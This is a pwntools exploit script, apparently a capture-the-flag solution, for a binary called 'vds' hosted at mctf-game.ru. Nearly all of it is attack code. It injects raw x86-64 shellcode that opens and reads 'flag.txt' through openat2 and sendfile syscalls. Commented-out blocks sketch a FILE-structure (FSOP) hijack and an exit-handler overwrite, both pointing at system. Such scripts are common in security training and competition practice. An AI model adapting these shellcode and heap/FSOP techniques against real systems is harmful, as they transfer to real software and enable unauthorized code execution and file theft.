from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./vds_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'mctf-game.ru'
port = 15557
cmd = f'''
    set solib-search-path {os.getcwd()}
    b *main+230
    b *child+177
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def check():
    chall.interactive()
    exit()

def main():
    _sendline(b'Enter 2 to exit vds manager', b'1')
    payload =   asm('''
                    mov rax, [rbp - 8]
                    push rax
                    ''') 
    payload += b'H\xc7\xc0\x02\x00\x00\x00PH1\xc0PPH\x8d\x14$I\xc7\xc2\x18\x00\x00\x00H\xc7\xc0./\x00\x00PH\x8d4$H\xc7\xc7\x9c\xff\xff\xffH\xc7\xc0\xb5\x01\x00\x00\x0f\x05'
    payload += asm (f'''
                    xor rax, rax
                    push rax
                    mov rax, 0x7478742e67616c66
                    push rax
                    mov rdi, 3
                    lea rsi, [rsp]
                    mov rax, 0x1b5
                    syscall
                    mov rdi, 1
                    mov rsi, 4
                    mov rdx, 0
                    mov r10, 0x100
                    mov rax, 0x28
                    syscall
                    ''')
    _sendline(b'>>', payload)
    check()
    _sendline(b'>>', payload)
    check()

if __name__ == "__main__":
    main()
